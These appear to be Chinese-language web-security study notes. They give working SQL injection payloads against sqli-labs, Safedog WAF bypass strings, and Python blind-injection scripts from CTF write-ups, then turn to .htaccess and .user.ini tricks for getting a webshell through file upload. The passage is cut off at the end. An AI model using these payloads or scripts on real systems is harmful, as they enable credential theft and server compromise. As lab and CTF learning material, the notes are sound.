<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153112525.png" alt="image-20230607153112525" style="zoom: 33%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')b join (select 3)c%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153154738.png" alt="image-20230607153154738" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(username,':',password) from users)b join (select 3)c#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153300026.png" alt="image-20230607153300026" style="zoom: 33%;" />

## 宽字节注入

### 前置知识

#### 输入实体化

为了保证网站的安全性，通常会对用户的输入来做安全过滤，并将敏感字符进行实体化。

实体化：在`' " \ NULL`这些字符串前面加`\`

```php
<?php
$id = "1' and 1=1#";
$payload = addslashes($id);
$sql = "select * from users where id = '{$payload}'";
var_dump($sql);

# 输出
string(45) "select * from users where id = '1\' and 1=1#'"
```

数据库执行

```sql
# 可以发现：由于实体化，使用反斜杆进行转移，使得单引号变成了字符串，没有起效。导致SQL攻击失效
mysql> select * from users where id = '1\' and 1=2#';
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set, 1 warning (0.00 sec)
```

### 注入原理

==首先要保证目标的数据库使用的是GBK编码==

将payload改为：`1%df' and 1=1#`，

```php
<?php
$id = "1%df' and 1=1#";
$id = addslashes($id);
$sql = "select * from users where id = '{$id}'";
var_dump($sql);

# 输出：
string(48) "select * from users where id = '1%df\' and 1=1#'"
```

此时，由于GBK的编码方式，会将`%df\`组成一个新字符，这个字符是一个汉字，导致`\`失效，`'`恢复功能：`1ߜ' and 1=1#`

### 注入流程-Less-32

#### 寻找回显位

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,2,3%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201323254.png" alt="image-20230607201323254" style="zoom:33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(schema_name),3 from information_schema.schemata%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201634066.png" alt="image-20230607201634066" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607201838412.png" alt="image-20230607201838412" style="zoom:33%;" />

#### 爆库

注意：`table_name='users'`这里的两个单引号无法逃逸，使用宽字节注入会造成语法错误，所以这里直接使用16进制

```
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203144060.png" alt="image-20230607203144060" style="zoom:33%;" />

#### 拖库

```
# 查询所有用户名
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(username),3 from users%23 
# 查询所有密码
http://192.168.231.129:9001/Less-32/?id=-1%df' union select 1,group_concat(password),3 from users%23 
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607203307391.png" alt="image-20230607203307391" style="zoom:33%;" />

## SQL注入-过狗

### 常见的WAF绕过语句

#### 注释

```
/*xxx*/：在SQL里，多行解释是 /* */
/*!xxx*/:MySQL扩展了解释的功能，如果后面加了!，那么注释符号将被执行
/*!50001xxxx*/：这里的50001表示如果数据库版本是：5.00.01以上版本，该语句才会被执行
# 最新版安全狗万能注释符绕过
/*//--**/
/*/!--**/
/*/-*!!*/
```

#### 替换

##### and、or替换

```
1、&&和||
2、使用异或或截断：?id=1^1^0		?id=1^0^0
3、使用{``operation}：and{`test` 1=2}		and{`test` 1=2}
4、直接使用真、假：&& true		&& false
```

##### order by替换

```
group by
```

##### union select

```
union all select
```

##### information_schema.tales

```
sys.schema_table_statistics_with_buffer
sys.schema_auto_increment_columns
mysql.innodb_table_stats
```

### 安全狗4.0.266-SQL注入过程

这里一开始使用教程给的注释符号无法绕过，开始做模糊测试

#### 模糊测试-注释符

==在做模糊测试之前需要先将安全狗的CC攻击检测关闭==

思路是往`/**/`里面填东西

![image-20230608172018747](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172018747.png)

![image-20230608172030624](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172030624.png)

可以发现有许多符号可以绕过安全狗

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608172756462.png" alt="image-20230608172756462" style="zoom:50%;" />

给出几个可成功绕过的符号

```
/*//--**/ 
/*//---**/
/*//--/*/
/*//--/*/
```

#### order by查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=1' order /*//--/*/ by 3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173502813.png" alt="image-20230608173502813" style="zoom:50%;" />

#### UNION 查询

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,2,3%23v
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173625895.png" alt="image-20230608173625895" style="zoom:50%;" />

#### 查看当前数据库

这里可以看到被安全狗防御了，问题就出在`dataase()`身上

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173708699.png" alt="image-20230608173708699" style="zoom:33%;" />

将注释符往database()里面放进去，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,database(/*//--/*/),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608173834474.png" alt="image-20230608173834474" style="zoom:50%;" />

#### 爆库

在做爆库的过程中，发现`from`后面不能再加东西

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174030426.png" alt="image-20230608174030426" style="zoom:50%;" />

尝试加上注释符，成功绕过！

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/abc%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174126231.png" alt="image-20230608174126231" style="zoom:50%;" />

再次发现安全狗对`information_schema`了防御

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174319537.png" alt="image-20230608174319537" style="zoom:50%;" />

尝试往`information_schema`中间加入注释符，成功绕过

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*//--/*/ select 1,group_concat(schema_name),3 from /*//--/*/information_/*//--/*/schema%23
```



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608174403861.png" alt="image-20230608174403861" style="zoom:50%;" />

这里在网上看到这条payload，大概意思应该是这样

```sql
# 使用 /*!*/ 使得 # 的注释功能生效，注释掉后面的abc字符串，再使用换行来逃过 # 的注释，1 为要查询的信息，最后使用*/来闭合注释
mysql> select /*!#abc
    -> 1*/;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)

/*!--+/*%0ainformation_schema.schemata*/ 完整解释
/*!--+  使得 --+ 注释功能生效
/*xxx*/ 混淆WAF
%0a		回车逃过 --+ 的注释
*/		最后使用 */ 来闭合前面的 /*
```



```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(schema_name)from/*!--+/*%0ainformation_schema.schemata*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180406635.png" alt="image-20230608180406635" style="zoom:50%;" />

#### 爆表

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(table_name)from/*!--+/*%0ainformation_schema.tables where table_schema=database()*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180519244.png" alt="image-20230608180519244" style="zoom:50%;" />

#### 爆字段

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(column_name)from/*!--+/*%0ainformation_schema.columns where table_schema=database() and table_name='users'*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180612648.png" alt="image-20230608180612648" style="zoom:50%;" />

#### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union/*/!*!**/select%201,2,group_concat(username,':',password)from/*!--+/*%0ausers*/--+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608180726467.png" alt="image-20230608180726467" style="zoom:50%;" />

### 安全狗4.0.266-无列名注入

安全狗对于输入有非常严格的过滤，一旦输入的字符串中包含了`information_schema`就会被拦截，所以这里学习一个`join 无列名报错注入`，==适用于无法使用`information_schema`但是知道数据表名的情况==

#### 注入原理

通过使用一张表做两次内联查询的方式来使得列名冲突的方式来使得数据库报错，并爆出冲突的列名

```sql
mysql> select * from (select * from users as a join users as b)c;
ERROR 1060 (42S21): Duplicate column name 'id'
mysql> select * from (select * from users as a join users as b using(id))c;
ERROR 1060 (42S21): Duplicate column name 'username'
mysql> select * from (select * from users as a join users as b using(id, username))c;
ERROR 1060 (42S21): Duplicate column name 'password'
mysql> select * from (select * from users as a join users as b using(id, username, password))c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

#### 注入流程

##### 爆字段

这里发现`union`和`from`后面都不能加东西，所以尝试加入注释符号绕过，成功得到第一个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b)c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195202683.png" alt="image-20230608195202683" style="zoom:50%;" />

使用 using 来排除字段，得到第二个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id))c --+
```

![image-20230608195241484](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195241484.png)

同样方法，得到第三个字段名

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195324303.png" alt="image-20230608195324303" style="zoom:50%;" />

回显正常，没有报错信息，列名爆破完成

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select * from (select * from /*/!--**/ users a join users b using(id, username, password))c --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195432015.png" alt="image-20230608195432015" style="zoom:50%;" />

##### 拖库

```
http://192.168.231.131/sqli-labs-master/Less-1/?id=-1' union /*/!--**/ select 1,2,group_concat(username,':',password) from /*/!--**/ users --+
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230608195615749.png" alt="image-20230608195615749" style="zoom:50%;" />

## SQL二次注入

次注入漏洞字面上理解可能就是结合两个注入漏洞点实现sql注入的目的，但是这其中还有几个细节需要讲解一下。首先，第一个注入点因为经过过滤处理所以无法触发sql注入漏洞，比如`addslashes`函数，将单引号等字符转义变成`\’`。但是存进数据库后，数据又被还原了，也就是反斜杠没了，在这种情况下，如果能发现一个新的注入同时引用了被插入了的数据库数据，就可以实现闭合新发现的注入漏洞引发漏洞。

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/doubleinject.png)

### [RCTF2015]EasySQL

这里的考点肯定是SQL注入的，后面看了一下WP才知道注入点在修改密码这里，且需要使用二次注入才能触发，这里直接注册一个`root\`用户

贴士：`\`是有转义作用的，好像是可以使用`\`将闭合转义从而引发报错；`\`测试的好处是不管闭合时单引号还是双引号都可以直接测试目标是否存在报错注入漏洞

从错误信息可知，这里使用的是双引号做闭合

![image-20240214172303769](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240214172303769.png)

而且由于注册页面是存在非法字符检测的，那么这里要先做一下FUZZ

![image-20240214182201589](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240214182201589.png)

然后根据FUZZ出来的结果做报错注入即可，由于这里`and`是被过滤的，所以使用`&&`绕过

```
# 数据库名
-1"&&extractvalue(0x7e,concat(0x7e,(select(database()))))#

# 表名
-1"&&extractvalue(0x7e,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))))#

# 字段名
-1"&&extractvalue(0x7e,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())&&(table_name='users'))))#

# 由于这里过滤了所有字符串截取函数，包括：substr、substring、mid、right、left，所以只能使用正则匹配的方式获取flag
# 匹配以 f 开头的字符串
-1"&&extractvalue(0x7e,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))))#

# 使用 reverse 函数将结果做反转再输出，就可以拿到剩下的flag
-1"&&extractvalue(0x7e,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')))))#

# flag{7392b5c2-0728-4d5e-aa86-50edc6c18f52}
```

## 异或盲注

异或盲注其实属于布尔盲注的一种，利用的是`^`运算符，通常用于`and`和`or`都被过滤的情况下

最后一条查询语句之所以做三次异或运算是利用：`true^true^true=true`以做精准测试

```
mysql> select 1^0;
+-----+
| 1^0 |
+-----+
|   1 |
+-----+
1 row in set (0.00 sec)

mysql> select 1^1;
+-----+
| 1^1 |
+-----+
|   0 |
+-----+
1 row in set (0.00 sec)

mysql> select 1^ascii(substr((select database()),1,1)) = 119^1;
+--------------------------------------------------+
| 1^ascii(substr((select database()),1,1)) = 119^1 |
+--------------------------------------------------+
|                                                0 |
+--------------------------------------------------+
1 row in set (0.00 sec)
```

最后这里直接补上脚本

```python
import requests
import time

base_url = 'http://0b6d9da5-92be-4f1c-9faa-934ba75ca8a1.node5.buuoj.cn:81/index.php'

payload_1 = "1^(ascii(substr((select database()),{},1)) < {})^1%23"
payload_2 = "id=1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1)) < {})^1%23"


database_name = ''
for i in range(1, 60):
    max_value = 123
    min_value = 33
    mid_value = (max_value + min_value) // 2
    while max_value - min_value != 1:
        data = {
            'id': payload_2.format(i, mid_value)
        }

        req = requests.post(base_url, data=data)
        if req.status_code != 200:
            time.sleep(0.8)
            continue

        if b'Nu1L' in req.content:
            max_value = mid_value
        else:
            min_value = mid_value

        mid_value = (max_value + min_value) // 2

    database_name += chr(mid_value)
    print(f"[database_name] {database_name}")
```

## 无列名布尔盲注

> 一般的CTF题在过滤了information.colums后就可以利用无列名join注入的方法拿到字段名，这种是属于不可以用这种方式解决的话就可以尝试这个方法

用于过滤了`information`和`join`或是没有报错回显的情况导致无法拿到字段名的情况

这里首先先看，我们其实可以以比较的方式判断出列的数量，由于`users`表中有3个字段，所以在比较的时候，也需要提供三列字段做比较，最后的`limit`是保证只返回一行数据，如果数据表中本身就只有一条数据也可以不用

```sql
mysql> select (select 1,2,3) = (select * from users limit 1);
+------------------------------------------------+
| (select 1,2,3) = (select * from users limit 1) |
+------------------------------------------------+
|                                              0 |
+------------------------------------------------+
1 row in set (0.00 sec)

mysql> select (select 1,2) = (select * from users limit 1);
ERROR 1241 (21000): Operand should contain 2 column(s)
mysql> select (select 1,2,3,4) = (select * from users limit 1);
ERROR 1241 (21000): Operand should contain 4 column(s)
```

在判断的字段数量之后就可以做数据比较了，如下：

MySQL是从左到右进行逐位比较的，他先会比较元素`1`，相同，再比较元素`f`

```
mysql> select (select 1,'f') > (select 1,'f');
+---------------------------------+
| (select 1,'f') > (select 1,'f') |
+---------------------------------+
|                               0 |
+---------------------------------+
1 row in set (0.00 sec)

mysql> select (select 1,'f') = (select 1,'f');
+---------------------------------+
| (select 1,'f') = (select 1,'f') |
+---------------------------------+
|                               1 |
+---------------------------------+
1 row in set (0.00 sec)
```

以此我们逐步测试也能拿到flag

```
mysql> select (select 1,'fl') > (select 1,'flag');
+-------------------------------------+
| (select 1,'fl') > (select 1,'flag') |
+-------------------------------------+
|                                   0 |
+-------------------------------------+
1 row in set (0.00 sec)

mysql> select (select 1,'fm') > (select 1,'flag');
+-------------------------------------+
| (select 1,'fm') > (select 1,'flag') |
+-------------------------------------+
|                                   1 |
+-------------------------------------+
1 row in set (0.00 sec)
```

最后贴上脚本

```py
import requests

url = 'http://3a8cd3ff-2046-45de-8762-2f9cf8fab9e7.node5.buuoj.cn:81/index.php'
z = ''
for i in range(1, 100):
    min = 32
    max = 127
    mid = (min + max) // 2
    while min < max:
        payload = "1^((select 1,'{}')>(select * from f1ag_1s_h3r3_hhhhh))".format(z + chr(mid))
        data = {
            "id": payload
        }
        s = requests.post(url=url, data=data)
        if 'Nu1L' in s.text:
            min = mid + 1
        else:
            max = mid
        mid = (max + min) // 2
    if chr(mid) == ' ':
        break
    z += chr(mid - 1)
    print(z)
print('result:', z.lower())
```

## 正则匹配盲注

这种方式与`like`盲注几乎一样，只不过写法不同而已，再匹配到第一个字符后，在接着逐个匹配即可

```sql
# like 盲注
mysql> select * from users where username like "D%";
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  3 | Dummy    | p@ssword |
| 12 | dhakkan  | dumbo    |
+----+----------+----------+
3 rows in set (0.00 sec)
```

正则匹配以`D`开头的用户名

```sql
mysql> select * from users where username regexp "^D";
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  3 | Dummy    | p@ssword |
| 12 | dhakkan  | dumbo    |
+----+----------+----------+
3 rows in set (0.00 sec)
```

## 单引号逃逸配合%00截断

像下面这条SQL语句，我们可以使用`\`将原本用作闭合username的单引号转成字符串，即：`username='123\' and passwd='`那么最后一个单引号就逃逸出来了，只要将其闭合就可以了

```sql
select * from users where username='' and passwd='';
select * from users where username='123\' and passwd='';

mysql> select * from users where username='123\' and password='||1;#'
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 15 | Spider   | Aa123456   |
| 16 | Spider   | Aa123456   |
| 17 | Spider   | Aa123456   |
| 18 | Spider   | Aa123456   |
| 20 | sugar    | Aa123456   |
+----+----------+------------+
18 rows in set (0.00 sec)
```

有些CTF题目会连`#`和`--`一起屏蔽，导致最后一个单引号无法闭合，此时可以使用`%00`代替，如下

![image-20240222050325281](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240222050325281.png)

#### [NCTF2019]SQLi

进来发现一个输入框并给出了SQL语句，经过测试，`'`和`--`、`#`均无法使用，此时就需要用到上面的知识点了

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240222050512997.png" alt="image-20240222050512997" style="zoom:50%;" />

经过测试，`and`和`or`都无法使用，尝试使用`||`代替成功，并跳转到`welcome.php`，基于这点就可以做盲注了

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240222050711605.png" alt="image-20240222050711605" style="zoom:50%;" />

这里需要使用`regexp`做盲注，直接上脚本

```py
import requests
import time

base_url = 'http://870ad837-755a-47ba-a09f-00b00f51047b.node5.buuoj.cn:81/'

passwd = ''
for j in range(1, 30):
    for i in range(33, 123):
        if i == 42 or i == 43 or i == 63: continue
        payload = f'||passwd/**/regexp/**/"^{passwd + chr(i)}";\x00'
        data = {
            'username': '123\\',
            'passwd': payload
        }

        req = requests.post(base_url, data=data)
        time.sleep(5)
        print(req.url, data)
        if 'welcome' in req.text:
            passwd += chr(i)
            print("passwd: ", passwd)
            break

print(passwd)
```

**注意：**`%00`要用`\x00`来代替；在Python中，字符串 ‘\x00’ 代表一个空字符。这是ASCII编码中的第一个字符，也被称为"null"字符。



# 文件上传

## `.htaccess`文件介绍

`htaccess`文件是Apache服务器中的一个配置文件，他复制相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

其中`.htaccess`文件内容

`SetHandler application/x-httpd-php`

==设置当前目录所有文件都使用`PHP`解析==，那么无论上传任何文件，只要文件内容符合`PHP`语言代码规范，就会被当作`PHP文件执行`。不符合则报错

### `.httpd.conf`

要使得`.htaccess`文件生效，则必须对`Apache`配置文件做以下配置

```bash
<Directory />
    AllowOverride all			# 启动 .htaccess 文件并允许用户对该文件进行修改（默认为none）
    Require all denied			# 禁止用户访问Apache运行目录
</Directory>
```

**AllowOverride的值**

+ None：不允许.htaccess文件覆盖任何配置选项
+ All：允许.htaccess文件覆盖所有配置选项
+ AuthConfig：允许.htaccess文件覆盖身份验证相关配置选项，如AuthType、AuthName、AuthUseFile等
+ Fileinfo：允许.htaccess文件覆盖文件和目录相关的配置选项，如DirectoryIndex、DefaultType、ErrorDocument
+ Limit：允许.htaccess文件覆盖与访问限制相关的配置选项，如Require
+ Options：允许.htaccess文件覆盖与文件处理选项相关的配置选项，如Options

## `.user.ini`

在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。

这个文件是php.ini的补充文件，==当访问PHP网页的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项==
其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。

此文件与`.htaccess`文件类似，能指定具体的文件当作PHP文件来执行，但是一定要记住：==只作用于当前目录下==

```
auto_prepend_file 表示加载第一个PHP代码之前执行指示（包含的）PHP文件
auto_append_file 表示加载第一个PHP代码之后执行指示（包含的）PHP文件
简单来说
 
auto_prepend_file = <filename>         //包含在文件头
auto_append_file = <filename>          //包含在文件尾
例如：auto_append_file、auto_prepend_file
指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。
```

## `.htaccess`和`.user.ini`文件总结

### 作用范围

`.htaccess`文件用于指定**当前目录**下的某个文件或全部文件当作PHP文件来执行，属于`Apache`的文件

`.user.ini`文件用于指定**当前目录**下的某个文件当作PHP文件来执行

### 激活

`.htaccess`文件在正确上传之后，Apache在加载某个文件之前会自动读取，只要保证`getshell`文件于`.htaccess`在同一目录就行

`.user.ini`文件在正确上传`getshell`文件之后必须先访问**同一目录**下的`PHP`文件，原因：`PHP`解释器在执行的时候会先检查当前目录是否存在`.user.ini`文件，存在则加载进配置文件`php.ini`，并执行配置文件的内容；后续使用蚁剑连接的URL则使用当前访问的PHP文件的URL来连接

## 各种配置文件总结

+ `.htaccess`
  + 作用：分布式配置文件，一般用于URL重写、认证、访问控制等
  + 作用范围：特定目录（一般是网站根目录）及其子目录
  + 优先级：较高，可覆盖Apache的主要配置文件（httpd-conf）
  + 生效方式：修改后立即生效
+ `httpd-conf`
  + 作用：包含apache HTTP 服务的全局行为和默认配置
  + 作用范围：整个服务器
  + 优先级：较低
  + 生效方式：管理员权限，重启服务器后生效
+ `.user.ini`
  + 作用：特定于用户或特定目录的配置文件，通常位于`web`应用程序的根目录下
  + 它作用域覆盖或追加全局配置文件（如：php.ini）中的PHP配置选项
  + 作用范围：存放该文件的目录及其子目录
  + 优先级：较高，可以覆盖php.ini
+ `php.ini`
  + 作用：存储了对整个PHP环境生效的配置选项，它通常位于PHP安装目录中
  + 作用范围：存放该文件的目录及其子目录
  + 优先级：较高，可以覆盖php.ini
  + 生效方式：立即

加载方式：后首先加载 `php.ini/httpd-conf`文件中的配置，然后，如果再某个目录下存在，`.user.ini/.htaccess`文件，服务器会再处理请求时检查该目录，并覆盖响应的配置项

**`.user.ini`生效前提：**

PHP版本最好大于5.3.0，最好是用7.X版本的

Server-API为`CGI/FastCGI` ----> `phpinfo()`查看

Server API（Application-Programming Interface，应用程序编程接口）是一组定义了软件组件之间交互方式的规范，在这种情况下，Server-API是指用于连接和交互的服务器端软件接口

**`.user.ini` 可以生效且目录下有php文件**

## Apache的.htaccess利用技巧

> 参考：https://xz.aliyun.com/t/8267?time__1311=n4%2BxuDgDBDyBD%3DD77D%2F%2BW4wDf2DmhEqxo8TD&alichlgref=https%3A%2F%2Fwww.cnblogs.com%2F#toc-1

### 1. 简介 

#### 1.1 基本概念

`.htaccess` 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 `Apache` 的 `AllowOverride` 指令来设置。
`.htaccess` 中有 `#` 单行注释符, 且支持 `\`拼接上下两行。

#### 1. 2 作用范围

`.htaccess` 文件中的配置指令作用于 `.htaccess` 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 `.htaccess` 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 `.htaccess` 文件中的指令可能会覆盖其上级目录中的 `.htaccess` 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。

#### 1.3 作用范围

启动 `.htaccess`，需要在服务器的主配置文件将 `AllowOverride` 设置为 `All`，如 apache2.conf

```
AllowOverride All  #启动.htaccess文件的使用
```

也可以将 `.htaccess` 修改为其他名

```
AccessFileName .config #将.htaccess修改为.config
```

**AllowOverride的值**

+ None：不允许.htaccess文件覆盖任何配置选项
+ All：允许.htaccess文件覆盖所有配置选项
+ AuthConfig：允许.htaccess文件覆盖身份验证相关配置选项，如AuthType、AuthName、AuthUseFile等
+ Fileinfo：允许.htaccess文件覆盖文件和目录相关的配置选项，如DirectoryIndex、DefaultType、ErrorDocument
+ Limit：允许.htaccess文件覆盖与访问限制相关的配置选项，如Require
+ Options：允许.htaccess文件覆盖与文件处理选项相关的配置选项，如Options

## 2. 常用指令

`.htaccess` 可以实现网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能

定义错误码的回显

```htaccess
ErrorDocument 404 /error/401.php
ErrorDocument 404 "page not found~"			# 也可以直接输出文本
```

#### 2.1 `SetHandler`

定义当前目录下的所有文件都会被当做`php`文件解析

```htaccess
SetHandler application/x-httpd-php
```

#### 2.2 `AddHandler`

`AddHandler` 可以在文件扩展名与特定的处理器之间建立映射

此时，`html`和`txt`文件都会被当做`PHP`文件执行

```htaccess
AddHandler application/x-httpd-php .html .txt
```

#### 2.3 `AddType`

`AddType` 可以将给定的文件扩展名映射到指定的内容类型

此时，`html txt jpg gif`都会被当做`PHP`文件执行

```htaccess
AddType application/x-httpd-php html txt jpg gif
```

#### 2.4 `php_value`

当使用 `PHP` 作为 `Apache` 模块时，也可以用 `Apache` 的配置文件（例如 `httpd.conf`）和 `.htaccess` 文件中的指令来修改 `php` 的配置设定。需要有`AllowOverride Options` 或`AllowOverride All` 权限才可以。

`php_value` 设定指定的值。要清除先前设定的值，把 `value` 设为 `none`。不要用 `php_value` 设定布尔值。应该用 `php_flag`。

查看[配置可被设定范围](https://www.php.net/manual/zh/configuration.changes.modes.php)

![20200909005616-35da5e78-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909005616-35da5e78-f1f4-1-17153414587804.png)



由上可知 `.htaccess` 只能用于 `PHP_INI_ALL` 或 `PHP_INI_PERDIR` 类型的指令。
查看[php.ini 配置选项列表](https://www.php.net/manual/zh/ini.list.php),寻找可利用指令

(1) 文件包含配置选项

![20200909005629-3d6761fe-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909005629-3d6761fe-f1f4-1-17153414810756.png)

- auto_prepend_file：在**主文件解析之前**自动解析包含的文件
- auto_append_file：在**主文件解析后**自动解析包含的文件

例如:

```htaccess
php_value auto_prepend_file images.png
```

访问一个 `php` 文件时，在该文件解析之前会先自动 images.png 文件当做PHP文件解析

![image-20240510194749111](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20240510194749111.png)

(2) 绕过preg_match

![20200909005642-4593e226-f1f4-1](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/20200909005642-4593e226-f1f4-1.png)

例如：

```
